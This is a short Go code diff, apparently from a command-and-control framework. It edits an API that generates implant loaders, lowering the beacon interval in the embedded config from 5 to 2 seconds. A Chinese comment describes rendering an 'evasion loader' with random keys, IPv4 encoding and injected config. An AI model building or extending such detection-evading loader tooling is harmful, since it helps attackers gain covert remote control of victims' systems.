@@ -96,7 +96,7 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 			enc = e
 		}
 	}
-	trailerJSON := fmt.Sprintf(`{"server":%q,"listener":%q,"protocol":%q,"password":%q,"encrypt":%q,"interval":5,"jitter":0.2}`,
+	trailerJSON := fmt.Sprintf(`{"server":%q,"listener":%q,"protocol":%q,"password":%q,"encrypt":%q,"interval":2,"jitter":0.2}`,
 		server, b.ListenerID, lisProtocol(lis), lisPassword(lis), enc)
 	// ② 模板渲染（随机密钥 + IPv4 编码 + trailer/落盘名注入）
 	src, err := renderEvasionLoader(tech.Path, pic, trailerJSON)
